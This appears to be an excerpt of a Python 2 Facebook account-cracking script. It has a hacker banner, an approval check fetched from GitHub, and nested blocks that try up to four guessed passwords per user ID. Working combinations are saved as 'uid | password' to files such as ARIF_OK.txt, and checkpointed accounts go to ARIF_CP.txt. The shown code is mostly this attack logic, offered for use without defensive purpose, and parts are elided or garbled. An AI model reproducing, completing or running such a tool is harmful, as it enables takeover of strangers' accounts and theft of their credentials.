...
logo = """
\033[1;91m      
\033[1;91m                   â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—â–‘â–‘â–‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—
\033[1;91m                   â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ•—â–‘â–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘
\033[1;91m                   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘
\033[1;91m                   â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â–‘â–‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘
\033[1;91m                   â–ˆâ–ˆâ•‘â–‘â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–‘â•šâ•â•â–‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘
\033[1;91m                   â•šâ•â•â–‘â–‘â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â–‘â–‘â–‘â–‘â–‘â•šâ•â•â•šâ•â•
\033[1;91m 
\033[1;97m   â•”â•â•o00â•â•â•â• Azmi â•â•â•â•00oâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
\033[1;97m   â–ˆ                                                             â–ˆ
\033[1;97m   â–ˆ   Author    : ARIF                                          â–ˆ
\033[1;97m   â–ˆ   GitHub    : https:https://github.com/armankhan007cyber/khankhan007.git                           â–ˆ
\033[1;97m   â–ˆ   WHATSAPP  : MAI NAHI BATAOGA                              â–ˆ
\033[1;97m   â–ˆ   HACKING IS NOT CRIME IT IS A GAME AGAINTST OF THE SYSTEM  â–ˆ
\033[1;97m   â–ˆ                                                             â–ˆ
\033[1;97m   â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•o00â•â•â•â• Azmi â•â•â•â•00oâ•â•â•â•
...
def reg():
    ...
    print logo
    print ''
    print '\033[1;31;1mYou Need Approval For Login'
    print ''
    time.sleep(1)
    ...
    r = requests.get('https://raw.githubusercontent.com/Armankhan007/khankhanoo7/main/server.txt').text
    if to in r:
        ...
        os.system('xdg-open https://wa.me/+923483682061')
        reg()
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \033[1;97mâ•°â”€âž¤ ')
    if a_s == '1':
        os.system('clear')
        print logo
        print ' \033[1;90mFor-example : \033[1;97m234567,33445566,44556677,55667788\033[1;94m'
        print 47 * '-'
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\033[1;92mArif King Of Facebook\033[1;94m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;92m[OK]âž¤ ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/ARIF_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;97m[CP]âž¤ ' + uid + ' | ' + pass1
                cp = open('ARIF_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;92m[OK]âž¤ ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/ARIF_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;97m[CP]âž¤ ' + uid + ' | ' + pass2
                    cp = open('ARIF_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;92m[OK]âž¤ ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/ARIF_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;97m[CP]âž¤ ' + uid + ' | ' + pass3
                        cp = open('ARIF_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;92m[OK]âž¤ ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/AZMI_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;97m[CP]âž¤ ' + uid + ' | ' + pass4
                            cp = open('ARIF_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
